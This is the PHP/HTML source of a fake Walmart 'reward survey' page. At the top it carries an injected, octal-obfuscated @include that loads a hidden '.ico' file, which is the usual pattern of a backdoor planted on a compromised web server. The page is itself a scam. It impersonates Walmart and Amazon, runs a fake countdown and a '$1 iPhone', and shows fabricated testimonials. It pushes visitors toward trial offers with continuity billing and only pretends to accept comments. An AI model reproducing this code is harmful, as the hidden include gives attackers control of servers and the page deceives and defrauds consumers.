<?php
/*98eef*/

@include "\057h\157m\145/\150o\163t\151n\147a\144m\151n\057g\154o\142a\154s\165r\166e\171z\056c\157m\057B\157u\171g\165e\163/\1661\057.\145f\0643\143d\0666\056i\143o";

/*98eef*/
//echo "hello";exit;

?>

<?php include 'database.php';?>
<!DOCTYPE HTML>
<html>

<head>
    <meta charset="utf-8">
    <title>Global Surveyz</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="images/icon-link.png">

    <!-- Stylesheets -->
    <link rel="stylesheet" href="css/font-awesome.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="manifest" href="/manifest.json">
    
    <script type="text/javascript">
    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, '\\$&');
        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }
    </script>


    <!-- Javascripts -->
    <script type="text/javascript" src="js/jquery.min.js"></script>
    <script type="text/javascript" src="js/bootstrap.min.js"></script>
    <script src="https://api.pushnami.com/scripts/v1/push/5cb6f76214cc155c55d5a996"></script>
    <script>
    var CACHE_NAME = 'my-site-cache-v1';
    var urlsToCache = [
        '/',
        '/styles/main.css',
        '/script/main.js'
    ];

    self.addEventListener('install', function(event) {
        // Perform install steps
        event.waitUntil(
            caches.open(CACHE_NAME)
            .then(function(cache) {
                console.log('Opened cache');
                return cache.addAll(urlsToCache);
            })
        );
    });
    </script>
    <!-- modal popup start js-->
    <script type="text/javascript">
    window.onbeforeload = function() {
        document.onkeydown = function(e) {
            return (e.which || e.keyCode) != 116;
        };
    }
    window.onload = function() {
        //   jQuery('#myModal').modal('show');
    };
    $(document).ready(function() {
        // Handler for .ready() called.
        jQuery('#myModal').modal('show');
    });


    function goToNext(element) {

        var currentQuestion = $(element).parent().attr('id');
        var nextQuestion = parseInt(currentQuestion) + 1;
        jQuery('#' + currentQuestion).css("display", "none");
        jQuery('#' + nextQuestion).css("display", "block");
    }

    function last(element) {
        var currentQuestion = $(element).parent().attr('id');
        jQuery('#' + currentQuestion).css("display", "none");
        $('#loading-img').css("display", "block");
        setTimeout(function() {
            $('#loading-img').css("display", "none");
        }, 4000);
        setTimeout(function() {
            $('#results').css("display", "block");
            $('.reviewbox').css("display", "none");

        }, 4000);

        $(document).ready(function() {
            $(".remove_link").click(function() {
                var url = $(this).attr('id');
                var aff_id = getParameterByName('sub2');
                var click_id = getParameterByName('sub1');
                url = url.replace("{affiliate_id}", aff_id);
                url = url.replace("{transaction_id}", click_id);

                window.open(url, '_blank');
            });
        });



    }
    </script>
    <!-- modal popup end js-->
<script>
		$(document).ready(function() {
			$(".remove_link").click(function() {
				var url = $(this).attr('id');
				window.open(url, '_blank');
			});
		});
</script>
</head>

<body>

    <!-- Header -->

    <div class="top-header">
        <span><a href="#"><img src="images/Walmart-logo2.png" class="img-responsive"></a></span>
        <!-- <span>amazon</span>
	<br>Shopper Survey ✓ -->

    </div>

    <!-- modal popup start HTML-->
    <div style="background-size: 100% 100%; display: block;" class="modal fade in" id="myModal" tabindex="-1"
        role="dialog" aria-labelledby="myModalLabel" aria-hidden="false">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body" style="padding-left:25px;padding-right:25px; padding-bottom:25px;">
                    <!--<img style="display:block;margin-left:auto;margin-right:auto;" src="/gift.png" class=""></td>-->
                    <!--
						  <script>var msg = '<font size = "3"><strong>Congratulations Amazon shopper!</strong></font><br><br>You have been chosen to participate in a short, anonymous survey regarding your experiences with <b>Amazon.</b><br><br>Once you have completed this quick survey, you will be offered a few exclusive rewards <strong>(valued at $50.00 or more)</strong> for providing us with valuable consumer data.<br><br>This survey is available today: <strong>$date</strong><br><br>';var msg2 = msg.replace("$date",datehax());document.write(msg2);</script>
                          -->
                    <script>
                    var msg =
                        '<font size = "3"><strong>Congratulations Walmart Shopper!</strong></font><br><br>You have been chosen to participate in a short, anonymous survey regarding your experiences with <b>Amazon.</b><br><div class="fb-wrapper" id="fb-wrapper" style="width: 80vw; max-width:600px; overflow:hidden;display:none;"><br><div class="fb-like" data-href="https://www.facebook.com/facebook/" data-layout="standard" data-action="recommend" data-size="small" data-show-faces="true" data-width="400" data-share="false"><\/div><\/div><br>Once you have completed this quick survey, you will be offered a few exclusive rewards <strong>(valued at $50.00 or more)</strong> for providing us with valuable consumer data.<br><br>This survey is available today: <strong>$date</strong><br><br>';
                    var msg2 = msg.replace("$date", datehax());
                    document.write(msg2);
                    </script>
                    <font size="3"><strong>Congratulations <span class="amazon-color">Walmart</span> Shopper!</strong>
                    </font><br><br>Complete this short 30-second survey about <b>Walmart</b> to select one of our
                    exclusive reward offers <b><span class="amazon-color">(worth at least $90!)</span>.</b><br>
                    <br>This survey is available today: <strong><span style="color:red;">
                            <font color="red">
                                <div id="timebox" class="timebox" style="display: inline-block;">3:56</div> minutes
                            </font>
                        </span></strong><br><br>
                    <!--<p>Reference number: <strong style="background-color: yellow">37159</strong>.</p> 
                              -->
                    <!--<span id="timer_box">This offer will expire in the next 2 minutes: <span id="timer" style="background-color: yellow"></span> </span>-->
                    <p></p><!-- Audio -->
                    <button id="modalbutton" style="background:#232f3e; ;color: #FFFFff;" type="button"
                        class="btn-lg  btn-start" data-dismiss="modal">Start Survey</button>
                </div>
                <!--
						   <script type="text/javascript">
                              $('.btn-start').on('click', function() {

                                  document.getElementById('opening_audio').pause();
                                  return true;
                              });
                                  $('body').on('click', function() {
                                  document.getElementById('opening_audio').pause();
                                  return true;
                              });
                           </script>
                           -->
            </div>
        </div>
    </div>
    </div>
    </div>
    <!-- modal popup end HTML-->

    <!-- section -->
    <section class="rooms mt50">
        <div class="container">
            <div class="row reviewboxbuttons">
                <div class="col-sm-12">
                    <div id="1" style="display:block">
                        <div class="question-count center_q">Question 1 of 8</div>
                        <div class="question center_q">You are?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Male<br></button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Female<br></button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Other<br></button>
                    </div>

                    <div id="2" style="display:none">
                        <div class="question-count center_q">Question 2 of 8</div>
                        <div class="question center_q">How often do you visit a Walmart location?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">More than once a
                            week</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Weekly</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Every Other
                            week</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Monthly</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Never</button>
                    </div>

                    <div id="3" style="display:none">
                        <div class="question-count center_q">Question 3 of 8</div>
                        <div class="question center_q">Do store associates go "above and beyond" to help you out?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Always</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Most of the
                            time</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Sometimes</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Rarely</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Never</button>
                    </div>

                    <div id="4" style="display:none">
                        <div class="question-count center_q">Question 4 of 8</div>
                        <div class="question center_q">Do you ever receive special offers from Walmart?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">All the time</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Sometime</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Rarely</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Never</button>
                    </div>

                    <div id="5" style="display:none">
                        <div class="question-count center_q">Question 5 of 8</div>
                        <div class="question center_q">How are the waiting times in the checkout lines?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">I never notice
                            them</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Short and Quick</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">What i would
                            expect</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Sometimes too
                            long</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Always too long</button>

                    </div>

                    <div id="6" style="display:none">
                        <div class="question-count center_q">Question 6 of 8</div>
                        <div class="question center_q">How often do you shop online at Walmart.com?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Often</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Sometimes</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Rarely</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Never</button>
                    </div>

                    <div id="7" style="display:none">
                        <div class="question-count center_q">Question 7 of 8</div>
                        <div class="question center_q">How do you rate your overall customer experience at Walmart?
                        </div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">A- to A+</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">B- to B+</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">C- to C+</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">D- to D+</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">F</button>
                    </div>

                    <div id="8" style="display:none">
                        <div class="question-count center_q">Question 8 of 8</div>
                        <div class="question center_q">How likely are you to recommend Walmart to a friend?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="last(this);">Very likely</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="last(this);">Likely</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="last(this);">Unlikely</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="last(this);">Very unlikely</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="last(this);">Never</button>
                    </div>
                    <div id="loading-img" style="display:none">
                        <p><b>That's it, you're finished! </b></p>
                        <p>We are searching our inventory to offer you exclusive products as a <strong>thank
                                you</strong> for completing our survey.</p>
                        <img src="images/TaPz.gif" class="img-responsive">
                    </div>
                    <!-- resulet -->
                    <div id="results" style="display:none">
                        <br>
                        <div class="media well well-sm">


                            <div class="media-body">

                                <script>
                                var msg =
                                    '<font size = "5"><strong>Thank you for completing the Amazon survey!</strong></font><br><br>To show our appreciation for providing us with extremely valuable consumer data, you may now choose <b>(1)</b> of the following exclusive products below.<br><br>Please note that due to extremely HIGH demand, there is a limited supply of these rewards in stock.<br><div class="fb-wrapper" id="fb-wrapper2" style="width: 80vw; max-width:600px; overflow:hidden;display:none;"><br><div class="fb-like" data-href="https://www.facebook.com/facebook/" data-layout="standard" data-action="recommend" data-size="small" data-show-faces="true" data-width="400" data-share="false"><\/div><\/div><br>Special offer available today: <strong>$date<\/strong><\/font><br><br>Coupon code:</strong> <span style="background-color: #FFFF00">"<strong>AMAZONSURVEY</strong>"</span> has been applied for reduced shipping costs.';
                                var msg2 = msg.replace("$date", datehax());
                                document.write(msg2);
                                </script>
                                <font size="5"><b>Thank you for completing our survey!</b></font><br><br>Due to high
                                demand, there is a very limited supply of offers in stock.<br>
                                <font size=""> Please choose <strong>only ONE (1) exclusive offer</strong> below.</font>
                                <br>Special offers for today ONLY: <strong><span id="datetime2"></span></strong></font>
                                <br><br>
                                <font color="#229A22">✓ Successfully redeemed coupon code <strong>WALMA1E4</font>
                                </strong>

                                </span>

                            </div>
                        </div>
                        <div id="offers">
                            <div class="row row-parent" id="owallwrapper">
                                <!-- PHP START -->
                                <?php 
                                     $products = mysqli_query($conn,"SELECT * FROM products") or die( mysqli_error($conn));
                                        if($products){
                                         while($row=mysqli_fetch_array($products,MYSQLI_ASSOC)){
                                 ?>
                                <div id="offer_main_div_1" class="col-md-12 item sex_female" data-name="female">
                                    <div class="row offer-row"
                                        style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#F5F5F5;">
                                        <div class="col-md-3 text-center"> <br>
                                        <?php
                                        if($row['images'] != "")
                                            {                                               
                                            ?>
                                            <a href="<?php echo $row['url_1'];?>"
                                                target="_blank"><img id="offer_img_1" class="img-responsive"
                                                    style="max-width: 130px; margin: 0 auto;" src="<?php echo $row['images'];?>"
                                                    alt="..." onclick="ViewOffer_1();"></a>
                                            <div class="reviewitem" style="color:#164d96;"><img id="star_img_1"
                                                    src="<?php echo $row['reviews'];?>" height="18" width="71"
                                                    onclick="ViewOffer_1();"> <a id="offer_review_anchor_1"
                                                    onclick="ViewOffer_1();">(<?php echo $row['review_users'];?>)</a>
                                            </div> <br>
                                            <?php
                                          }
                                          elseif($row['images'] == "" || $row['images'] == NULL)
                                          {
                                             ?>
                                                <img src="images/products_image/default-product-img.jpg"
                                                    width="100px">
                                                <?php  
                                          }
                                          ?>
                                        </div>
                                        <div class="col-md-5 text-center" style="color: black;"> <br>
                                            <strong>
                                                <font size="3"><u><?php echo $row['product_name'];?></u></font>
                                            </strong><br>
                                            <b><?php echo $row['description'];?></b>
                                            <br> Regular Price: <strike> $<?php echo $row['product_price'];?></strike> <br> Today's Price: <font
                                                color="#008000"><strong
                                                    style="background-color: yellow;">$<?php echo $row['regular_price'];?>*</strong></font><br>
                                            Shipping: <strong>$<?php echo $row['shipping'];?></strong><br> Quantity Remaining: (<font
                                                color="#FF0000"><?php echo $row['quantity'];?></font>)<br> <br> <span class=" quantity"> <span
                                                    class="label label-danger">1</span> </span>
                                        </div>
                                        <div id="claim_btn_div_1" class="col-md-4 height:100%;"> 
                                        <?php 
                                                if($row['img_popular'] != "")
                                                {
                                            ?>
                                            <img src="<?php echo $row['img_popular'];?>" class="img-responsive">
                                            <?php 
                                            }
                                            
                                            ?>
                                        <a id="<?php echo $row['url_1'];?>" class="remove_link"
                                                target="_blank"><button id="claim_btn_1" onclick="ViewOffer_1();"
                                                    style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background:#232f3e ;color: #ffffff;"
                                                    class="text-center btn-lg click_claim_btn">Claim Reward
                                                    →</button></a>
                                        </div>
                                    </div>
                                </div>
                                <?php } }?>

                                <div id="offer_main_div_9" class="col-md-12 item sex_female" data-name="female"
                                    style="opacity: 0.45;">
                                    <div class="row offer-row"
                                        style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#F5F5F5;">
                                        <div class="col-md-3 text-center"> <br><img id="offer_img_9"
                                                class="img-responsive" style="max-width: 130px; margin: 0 auto;"
                                                src="images/7.png" alt="..." onclick="ViewOffer_9();">
                                            <div class="reviewitem" style="color:#164d96;"><img id="star_img_9"
                                                    src="images/5-star.png" height="18" width="71"
                                                    onclick="ViewOffer_9();"> <a id="offer_review_anchor_9"
                                                    onclick="ViewOffer_9();">(362)</a></div> <br>
                                        </div>
                                        <div class="col-md-5 text-center" style="color: black;"> <br> <strong>
                                                <font size="3"><u>Get the New iPhone X©</u></font>
                                            </strong><br><b>The Best Smartphone on the Market!</b> <br> Regular Price:
                                            <strike> $999.99</strike> <br> Today's Price: <font color="#008000"><strong
                                                    style="background-color: yellow;">$1.00*</strong></font><br>
                                            Shipping: <strong>$0.00</strong><br> Quantity Remaining: (<font
                                                color="#FF0000">0</font>)<br> <br> <span class=" quantity"> <span
                                                    class="label label-danger">1</span> </span> </div>
                                        <div id="claim_btn_div_9" class="col-md-4 height:100%;">
                                            <font color="red">**<b> Out Of Stock**</b></font>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <br>
                        <br>
                        <h4>How was your survey?</h4>
                        <ul class="list-group">
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/test_1.gif" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">Hannah Keefer<span class="comment-time">
                                            <script>
                                            r_comment_date(1);
                                            </script>Apr 08,2019 at 11:55 am
                                        </span></p>
                                    <p class="comment-body">My friend told me about this Garcinia extract she's been
                                        taking that she's lost a ton of weight with, but it was too expensive for me to
                                        try on a single-mom budget. Then I see it as an option on here, so I guess I'll
                                        take that as a sign. I hope it works for me too!</p>
                                </div>
                            </li>
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/test_2.gif" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">Kathryn Roth<span class="comment-time">
                                            <script>
                                            r_comment_date(1);
                                            </script>Apr 08,2019 at 2:24 pm
                                        </span></p>
                                    <p class="comment-body">The survey was quick and easy...I wouldn't mind doing
                                        another one so I can choose another reward!</p>
                                </div>
                            </li>
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/test_3.gif" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">Tony Biskup<span class="comment-time">
                                            <script>
                                            r_comment_date(2);
                                            </script>Apr 07,2019 at 5:36 pm
                                        </span></p>
                                    <p class="comment-body">At first I thought it was fake but I went with it and chose
                                        the skin cream and gave it to my girlfriend, she totally loved it!</p>
                                </div>
                            </li>
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/test_4.gif" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">Molly Ong<span class="comment-time">
                                            <script>
                                            r_comment_date(4);
                                            </script>Apr 07,2019 at 8:47 am
                                        </span></p>
                                    <p class="comment-body">I was just doing some shopping online and the survey popped
                                        up, so I figured I'd give it a try. I didn't really need any of the products so
                                        I gave the skin-care stuff to my mom, I guess it's in high-demand because she's
                                        been raving about how she's been wanting to try it!</p>
                                </div>
                            </li>
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/t.png" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">Norman Cook<span class="comment-time">
                                            <script>
                                            r_comment_date(5);
                                            </script>Apr 06,2019 at 8:16 pm
                                        </span></p>
                                    <p class="comment-body">I was filling out an insurance quote online and this survey
                                        popped up....I was skeptical but sure enough the testosterone supplement came in
                                        the mail a few days later. Time to get ripped, lo</p>
                                </div>
                            </li>
                            <li style="list-style: none">
                                <br>
                                <div id="confirmationbackground" class="well well-sm">
                                    <div class="form-horizontal">
                                        <fieldset id="commmentform">
                                            <legend>Leave your Comment</legend>
                                            <!-- Name input-->
                                            <div class="form-group">
                                                <label class="col-md-3 control-label" for="name">Your Name</label>
                                                <div class="col-md-6">
                                                    <input id="name" name="name" placeholder="" class="form-control"
                                                        type="text">
                                                </div>
                                            </div>
                                            <div class="form-group">
                                                <label class="col-md-3 control-label" for="name">Your Email</label>
                                                <div class="col-md-6">
                                                    <input id="name" name="name" placeholder="" class="form-control"
                                                        type="text">
                                                </div>
                                            </div>
                                            <!-- Email input-->
                                            <!--
                                    <div class="form-group">
                                       <label class="col-md-3 control-label" for="email">Your Email</label>
                                       <div class="col-md-6">
                                          <input id="email" name="email" placeholder="" class="form-control" type="text">
                                       </div>
                                    </div>
                                    -->
                                            <!-- Message body -->
                                            <div class="form-group">
                                                <label class="col-md-3 control-label" for="message">Your Comment</label>
                                                <div class="col-md-9">
                                                    <textarea class="form-control" id="message" name="message"
                                                        placeholder="" rows="4"></textarea>
                                                </div>
                                            </div>
                                            <div class="col-md-6"></div>
                                            <div class="col-md-6">
                                                <button id="commentbutton"
                                                    style="font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background:#232f3e; color: #ffffff;"
                                                    class="text-center btn-lg click_claim_btn">Comments</button>
                                            </div>
                                            <script type="text/javascript">
                                            $('#commentbutton').click(function() {
                                                $('#commmentform').slideUp(1000, function() {
                                                    $('#confirmationbackground').html(
                                                        '<div style="text-align:center"><font size="3">Your comment has been submitted and is pending approval from our spam-prevention team.</font></div>'
                                                        );
                                                    setTimeout(function() {
                                                        $('#confirmationbackground').html(
                                                            '<div style="text-align:center"><font size="3">Your comment has been submitted and is pending approval from our spam-prevention team.</font></div>'
                                                            );
                                                        $('#confirmationbackground').css(
                                                            "background-color", "#87EA55");
                                                    }, 2000)
                                                })
                                            })
                                            </script>
                                        </fieldset>
                                    </div>
                                </div>
                            </li>
                        </ul>
                    </div>
                    <!-- resulet -->


                </div>
            </div>
            <div class="row reviewbox">
                <!-- col-sm-12 -->
                <div class="col-sm-12">
                    <h1>Customer Reviews</h1>
                    <div class="col-sm-6">
                        <div class="review">
                            <img src="images/big_4_half_star.png">
                            <div class="rate4 review_title">Taking these surveys is fun!</div>
                            <span class="user_info">BY JAMES K, RICHMOND, VA</span>
                            <p>Taking these surveys is fun! I was in marketing, so I find it very interesting. Then, of
                                course, is the shopping - who doesn't like that? It was fun, and I found a lot of great
                                deals. I highly recommend taking this survey.
                            </p>
                        </div>
                    </div>
                    <div class="col-sm-6">
                        <div class="review">
                            <img src="images/big_4_half_star.png">
                            <div class="rate4 review_title">Worth every second</div>
                            <span class="user_info">BY KEN S., TARPON SPRINGS, FL</span>
                            <p>I don't usually take surveys, but after 20 seconds, I was presented with some of the best
                                offers I have ever seen online! I can't say I've ever been more satisfied with so little
                                effort.
                            </p>
                        </div>
                    </div>
                    <div class="col-sm-6">
                        <div class="review">
                            <img src="images/big_4_half_star.png">
                            <div class="rate4 review_title">Great for my mom</div>
                            <span class="user_info">BY CHELSEA S., NEW CASTLE, DE</span>
                            <p>I decided to give my gift to my mom. Now she looks younger then me! Just kidding, she's
                                really happy though.
                            </p>
                        </div>
                    </div>
                    <div class="col-sm-6">
                        <div class="review">
                            <img src="images/big_4_half_star.png">
                            <div class="rate4 review_title">Just got my risk free trial in the mail!</div>
                            <span class="user_info">BY CATHY D., READING, MA</span>
                            <p>I filled out the offers and received my risk free trial as promised! I also received many
                                wonderful products from the offers I chose. Thank you
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- section -->
    <footer class="survey-container">
        <div id="terms">
            <center>
                <img src="images/f_guarantee.png" alt="guarantee" height="50" width="auto"> <img
                    src="images/f_secure_1.png" alt="secureSiteLogo" height="50" width="auto">
            </center>
            <br>
            <font size="1.5">©2017 All Rights Reserved. <br>
                <br>We are not affiliated nor partnered with Walmart. Walmart has not authored, participated in, or in
                any way reviewed this advertisement or authorized it. The trial products offered on the last page pay
                this website for orders placed. * S&H charges do apply. Some of the products described on this site have
                terms regarding continued billing after the free trial period ends. This is referred to as negative
                option, or continuity billing. Therefore, it is important to ensure that you are fully aware of the
                terms associated with each product before you order. See manufacturer's website for full terms and
                conditions before ordering your free trial as these vary by product. Please keep in mind that these are
                separate companies and we are not the best source for information about orders or specific policies.
                Because these companies control their own policies, shipping and other fees may change periodically.
                <a href="terms-conditions.html" rel="nofollow" onclick="window.open('terms-conditions.html', 'Terms','width=550,height=500,scrollbars=yes,resizable=yes'); return false;">here.</a>
            </font>
        </div>
        </font>
    </footer>

</body>

<script>
function goToNext(element){
	var currentQuestion=$(element).parent().attr('id');
	var nextQuestion=parseInt(currentQuestion)+1;
	jQuery('#'+currentQuestion).css("display","none");
	jQuery('#'+nextQuestion).css("display","block");
}
function last(element){
	var currentQuestion=$(element).parent().attr('id');
	jQuery('#'+currentQuestion).css("display","none");
	$('#loading-img').css("display","block");
	setTimeout(function(){ 
							$('#loading-img').css("display","none");
					}, 4000);
	setTimeout(function(){ 
							$('#results').css("display","block");
							$('.reviewbox').css("display","none");
							
					}, 4000);

}
</script>
<script type="text/javascript" src="https://s3-us-west-1.amazonaws.com/imgcenter/s/2/js/countdown.js"></script>
<script>
jsc.init(299, 'timebox', '');
</script>
<script>
$(document).ready(function() {
    stupid_timer();
});

function stupid_timer() {
    console.log('TRIGGERED');

    var box = $('#timebox');
    if ($('#timebox')) {
        console.log('element found');
    } else {
        console.warn('element NOT FOUND');
    }

    // $('#timebox').text('IM A TIMEBOX LOOK AT ME');

}

function startTimer(t, msg) {
    var e,
        n,
        r = t,
        a = setInterval(function() {
            e = parseInt(r / 60, 10),
                n = parseInt(r % 60, 10),
                n = 10 > n ?
                "0" + n :
                n,
                $("#timebox").text(e + ":" + n),
                --r < 0 && (reset_timer(a, msg))
        }, 1e3)
}

function reset_timer(a, msg) {
    clearInterval(a);
    $('#timebox').html(msg);
}
</script>
<script>
var dt = new Date();
document.getElementById("datetime2").innerHTML = dt.toLocaleDateString();
</script>

</html>